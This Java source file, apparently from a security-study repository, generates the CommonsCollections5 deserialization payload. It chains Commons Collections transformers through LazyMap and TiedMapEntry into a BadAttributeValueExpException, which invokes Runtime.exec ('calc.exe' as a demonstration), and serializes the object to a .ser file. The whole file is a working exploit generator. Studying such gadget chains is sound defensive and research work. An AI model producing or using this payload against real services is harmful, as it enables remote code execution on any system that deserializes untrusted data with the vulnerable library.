package CommonsCollections5;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class exp {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException {
        //构造内部的转换链
        Transformer[] trans = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,null}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"})
        };
        ChainedTransformer chian = new ChainedTransformer(trans);

        HashMap map = new HashMap();
        Map innerMap = LazyMap.decorate(map,chian);
        //构造外部的触发链
        TiedMapEntry entry = new TiedMapEntry(innerMap, "tr1ple");

        BadAttributeValueExpException val  = new BadAttributeValueExpException(null);
        Field valField = val.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(val,entry);

        //序列化
        File file;
        file =new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections5.ser");
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(file));
        obj.writeObject(val);

    }
}
